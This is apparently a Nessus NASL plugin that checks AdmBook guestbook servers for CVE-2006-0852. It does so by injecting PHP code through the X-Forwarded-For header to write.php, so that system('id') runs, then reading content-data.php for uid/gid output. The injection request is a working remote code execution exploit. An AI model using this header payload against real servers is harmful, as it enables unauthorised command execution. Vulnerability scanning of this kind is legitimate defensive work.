#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: rgod
#
# This script is released under the GNU GPLv2
# Special thanks to George
#

include("compat.inc");

if (description) {
script_id(21080);
script_cve_id("CVE-2006-0852");
script_bugtraq_id(16753);
script_xref(name:"OSVDB", value:"23365");
script_version("$Revision: 1.9 $");

script_name(english:"Admbook content-data.php X-Forwarded-For Header Arbitrary PHP Code Injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary code
injection." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AdmBook, a PHP-based guestbook. 

The remote version of this software is prone to remote PHP code
injection due to a lack of sanitization of the HTTP header
'X-Forwarded-For'.  Using a specially-crafted URL, a malicious user
can execute arbitrary command on the remote server subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/admbook_122_xpl.pl" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();


summary["english"] = "Checks for remote PHP code injection in Admbook";
script_summary(english:summary["english"]);

script_category(ACT_DESTRUCTIVE_ATTACK);
script_copyright(english:"This script is Copyright (C) 2006-2009 David Maciejak");

family["english"] = "CGI abuses";
script_family(english:family["english"]);

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/admbook", "/guestbook", "/gb", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  cmd = "id";
  magic = rand_str();

  req = http_get(
    item:string(
      dir, "/write.php?",
      "name=nessus&",
      "email=nessus@", this_host(), "&",
      "message=", urlencode(str:string("Nessus ran ", SCRIPT_NAME, " at ", unixtime()))
    ),
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      'X-FORWARDED-FOR: 127.0.0.1 ";system(', cmd, ');echo "', magic, '";echo"\r\n',
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  # nb: there won't necessarily be any output from the first request.

  req = http_get(item:string(dir, "/content-data.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if(magic >< res && output = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res))
  {
    report = string(
      "\n",
      "It was possible to execute the command '", cmd, "' on the remote\n",
      "host, which produces the following output :\n",
      "\n",
      output
    );

    security_hole(port:port, extra:report);
  }
}
